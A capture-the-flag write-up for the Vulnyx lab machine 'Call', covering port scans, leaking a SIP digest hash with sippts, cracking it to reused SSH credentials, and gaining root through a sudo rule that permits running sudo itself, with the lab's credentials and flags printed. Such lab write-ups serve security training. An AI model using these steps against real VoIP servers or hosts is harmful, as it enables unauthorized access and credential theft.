# Vulnyx: Call

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `sippts` · `ssh` |
| **Tags** | `#SIP` `#VoIP` `#InfoDisclosure` `#CredentialReuse` `#SudoAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A UDP scan turns up a SIP service, and `sippts` — a dedicated SIP pentesting toolkit — is used to scan, enumerate, and leak a password hash out of it via SIP's own digest authentication. That cracks to a working SSH credential. From there, a `sudo` rule that allows running `sudo` itself is about as unrestricted as `sudo` access gets.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn call.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:2F:66:C9 (Oracle VirtualBox virtual NIC)
```

Two TCP ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV call.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.61 (Debian)
|_http-title: CallMe
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 08:00:27:2F:66:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://call.nyx
```

<img src="../Images/call/Pasted image 20260818130112.png"/>

A directory scan turns up nothing beyond the default index:

```bash
$ gobuster dir -u 'http://call.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html            (Status: 200) [Size: 297]
server-status         (Status: 403) [Size: 273]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

### SIP Enumeration

With the web side a dead end, a UDP sweep is worth running — a TCP-only scan would miss anything on UDP entirely:

```bash
$ sudo nmap -sU --top-ports 1000 call.nyx

PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
5060/udp open|filtered sip
MAC Address: 08:00:27:2F:66:C9 (Oracle VirtualBox virtual NIC)
```

That turns up a SIP service — VoIP signaling, typically on port 5060/udp. `sippts` runs through its standard workflow against it: a general scan, enumeration of valid methods, and an attempt to leak credential material directly from the service:

```bash
$ sippts scan -i call.nyx

[v] IP/Network: <IP_Victim>
[v] Port range: 5060
[v] Protocol: UDP
[v] Method to scan: OPTIONS
[v] Used threads: 1

+------------+------+-------+----------+------------+------+
| IP address | Port | Proto | Response | User-Agent | Type |
+------------+------+-------+----------+------------+------+
| Nothing found                                             |
+------------+------+-------+----------+------------+------+

Time elapsed: 5 sec(s)
```

```bash
$ sippts enumerate -i call.nyx

[v] IP address: call.nyx:5060/UDP

INVITE   ⇒ 180 Ringing (User-Agent: Not found) / 200 OK (User-Agent: Not found)
BYE      ⇒ 200 OK (User-Agent: Not found)
CANCEL   ⇒ 200 OK (User-Agent: Not found)
NOTIFY   ⇒ Timeout error
REGISTER ⇒ Timeout error
SUBSCRIBE⇒ Timeout error
MESSAGE  ⇒ Timeout error
PUBLISH  ⇒ Timeout error
OPTIONS  ⇒ Timeout error
ACK      ⇒ Timeout error
INFO     ⇒ Timeout error
REFER    ⇒ Timeout error
PRACK    ⇒ Timeout error
UPDATE   ⇒ Timeout error

+----------+----------------------------+------------+-------------------+
| Method   | Response                   | User-Agent | Fingerprinting    |
+----------+----------------------------+------------+-------------------+
| INVITE   | 180 Ringing / 200 OK       | Not found  | FreeSWITCH        |
| BYE      | 200 OK                     | Not found  | Too many matches  |
| CANCEL   | 200 OK                     | Not found  | Too many matches  |
| NOTIFY   | Timeout                    |            |                   |
| REGISTER | Timeout                    |            |                   |
| SUBSCRIBE| Timeout                    |            |                   |
| MESSAGE  | Timeout                    |            |                   |
| PUBLISH  | Timeout                    |            |                   |
| OPTIONS  | Timeout                    |            |                   |
| ACK      | Timeout                    |            |                   |
| INFO     | Timeout                    |            |                   |
| PRACK    | Timeout                    |            |                   |
| UPDATE   | Timeout                    |            |                   |
| REFER    | Timeout                    |            |                   |
+----------+----------------------------+------------+-------------------+

Time elapsed: 5 sec(s)
```

```bash
$ sippts leak -i call.nyx

[v] Target: <IP_Victim>:5060/UDP
[v] Auth mode: WWW-Authenticate

[⇒] Request INVITE
[⇐] Response 180 Ringing
[⇐] Response 200 OK
[⇒] Request ACK
      ... waiting for BYE ...
[⇐] Received BYE
[⇒] Request 407 Proxy Authentication Required
[⇐] Received BYE
[⇒] Request 200 Ok
Auth-Digest username="phone", uri="sip:127.0.0.1:5060", password="b9bb7e7b00a4ba1e0d15fa8b2485d8c4", algorithm=MD5

+------------+------+-------+-----------------------------------------------------------------------------------------------------------------+
| IP address | Port | Proto | Response                                                                                                       |
+------------+------+-------+-----------------------------------------------------------------------------------------------------------------+
| <IP_Victim> | 5060 | UDP  | Digest username="phone", uri="sip:127.0.0.1:5060", password="b9bb7e7b00a4ba1e0d15fa8b2485d8c4", algorithm=MD5 |
+------------+------+-------+-----------------------------------------------------------------------------------------------------------------+
```

SIP's digest authentication relies on an MD5-based challenge-response; certain misconfigured servers can be tricked into revealing enough of that exchange to recover a password hash, which is what `sippts leak` automates:

> **Password hash:** `b9bb7e7b00a4ba1e0d15fa8b2485d8c4`

That hash cracks offline to a plaintext password:

<img src="../Images/call/Pasted image 20260818130455.png"/>

> **Credentials:** `phone:telephone`

## Initial Access

The SIP credentials turn out to be reused for SSH as well:

```bash
$ ssh phone@call.nyx
phone@call.nyx's password:
phone@call:~$ id
uid=1000(phone) gid=1000(phone) grupos=1000(phone)
phone@call:~$ ls -l /home/phone/
total 4
-r--------    1 phone    phone           33 jul 12  2024 user.txt
phone@call:~$ cat /home/phone/user.txt
ca1b5855e58d5009c37e0813642e8780
```

> **User flag:** `ca1b5855e58d5009c37e0813642e8780`

## Privilege Escalation

### `sudo` Allowing `sudo` Itself

```bash
phone@call:~$ sudo -l
Matching Defaults entries for phone on call:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User phone may run the following commands on call:
    (root) NOPASSWD: /usr/bin/sudo
```

`phone` can run `/usr/bin/sudo` as root via `sudo` — which is effectively unrestricted, since a process running `sudo` as root can use it to run anything else as root too, regardless of how narrow the original rule was meant to be:

```bash
phone@call:~$ sudo -u root /usr/bin/sudo su
root@call:/home/phone# id
uid=0(root) gid=0(root) grupos=0(root)
root@call:/home/phone# ls -l /root
total 8
-r--------    1 root     root            33 jul 12  2024 root.txt
drwx------    2 root     root          4096 jul 12  2024 voip
root@call:/home/phone# cat /root/root.txt
703ea4b3228faa3a0248e12209c88760
```

> **Root flag:** `703ea4b3228faa3a0248e12209c88760`

## Takeaways

- SIP/VoIP services are worth enumerating with dedicated tooling (`sippts`, `sipvicious`, and similar) rather than treating them as an afterthought — digest authentication leaks are a real, documented class of SIP misconfiguration, not a generic web vulnerability adapted to a new protocol.
- Credential reuse between a specialized service (SIP, in this case) and general system accounts (SSH) turns a protocol-specific leak into full account compromise.
- A `sudo` rule is only as restrictive as the least restrictive command it allows — granting `sudo` itself (or anything else capable of running arbitrary commands as root) defeats the purpose of narrowing the rule at all.